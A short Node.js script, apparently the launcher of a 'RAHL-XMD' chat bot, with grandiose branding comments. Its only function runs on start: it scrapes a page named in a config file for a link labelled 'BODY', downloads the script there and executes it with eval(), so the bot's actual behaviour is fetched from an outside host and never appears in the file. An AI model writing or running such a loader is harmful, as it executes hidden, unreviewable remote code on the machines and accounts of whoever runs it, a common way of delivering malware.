//  [👑 RAHL-XMD QUANTUM EDITION]                                          
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by His Highness: Rahl                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const rahl = require("./config");

async function fetchBODYUrl() {
  try {
    const response = await axios.get(rahl.BWM_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("BODY")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('💔 Heart not found 😭');
    }

    console.log('❤️ The heart is loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('❌ Error:', error.message);
  }
}

fetchBODYUrl();
